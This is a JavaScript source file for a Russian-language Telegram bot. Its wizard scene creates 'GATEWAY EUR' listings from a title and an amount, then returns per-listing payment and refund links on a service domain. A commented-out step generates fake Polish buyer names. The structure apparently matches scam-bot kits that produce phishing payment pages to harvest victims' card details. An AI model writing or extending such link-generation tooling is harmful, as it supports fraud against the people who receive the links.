const WizardScene = require("telegraf/scenes/wizard");
const { Request, Ad, Service } = require("../../database");
const locale = require("../../locale");
const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const log = require("../../helpers/log");
const cheerio = require("cheerio");
const { default: axios } = require("axios");
const rand = require("../../helpers/rand");
const menu = require("../../commands/menu");

const faker = require("faker/locale/pl");
const downloadImage = require("../../helpers/downloadImage");

const scene = new WizardScene(
  "create_link_gateway2_lp",
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "gateway2_lp",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      ctx.scene.state.data = {};
      log(ctx, "перешёл к созданию ссылки GATEWAY EUR");
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene
        .reply("Введите информацию платежной ссылки", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message.text) return ctx.wizard.prevStep();

      ctx.scene.state.data.title = escapeHTML(ctx.message.text);
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene
        .reply("Введите сумму транзакции (только число, в EUR)", {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      var amount = parseFloat(ctx.message.text);
      if (isNaN(amount)) return ctx.wizard.prevStep();
      if (amount % 1 == 0) amount = amount.toFixed(0);
      else amount = amount.toFixed(2);

      amount = amount + " EUR";

      ctx.scene.state.data.price = amount;

      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  // async (ctx) => {
  //   try {
  //     await ctx.scene
  //       .reply("Введите имя покупателя (Формат: Имя Фамилия)", {
  //         reply_markup: Markup.inlineKeyboard([
  //           [Markup.callbackButton("Автоматическая генерация", "auto")],
  //           [Markup.callbackButton("Отменить", "cancel")],
  //         ]),
  //       })
  //       .catch((err) => err);
  //     return ctx.wizard.next();
  //   } catch (err) {
  //     ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
  //     return ctx.scene.leave();
  //   }
  // },
  // async (ctx) => {
  //   try {
  //     if (!ctx.message.text && ctx.callbackQuery.data != "auto")
  //       return ctx.wizard.prevStep();
  //     if (ctx.callbackQuery.data == "auto") {
  //       ctx.scene.state.data.name = faker.name.findName();
  //       await ctx
  //         .reply(
  //           `🤖 Сгенерированное имя: <b>${ctx.scene.state.data.name}</b>`,
  //           {
  //             parse_mode: "HTML",
  //           }
  //         )
  //         .catch((err) => err);
  //     } else ctx.scene.state.data.name = ctx.message.text;
  //     return ctx.wizard.nextStep();
  //   } catch (err) {
  //     ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
  //     return ctx.scene.leave();
  //   }
  // },
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "gateway2_lp",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      const ad = await Ad.create({
        id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
        userId: ctx.from.id,
        ...ctx.scene.state.data,
        serviceCode: "gateway2_lp",
      });

      log(ctx, `создал объявление GATEWAY EUR <code>(ID: ${ad.id})</code>`);
      await ctx.scene.reply(
        `<b>✅ Ссылка 💳 GATEWAY EUR сгенерирована!</b>
      
🔗 Получение оплаты: <b>https://${service.domain}/${ad.id}</b>
🔗 Возврат: <b>https://${service.domain}/refund/${ad.id}</b>`,
        {
          parse_mode: "HTML",
        }
      );
      ctx.updateType = "message";
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
    }
    return ctx.scene.leave();
  }
);

scene.leave(menu);

module.exports = scene;
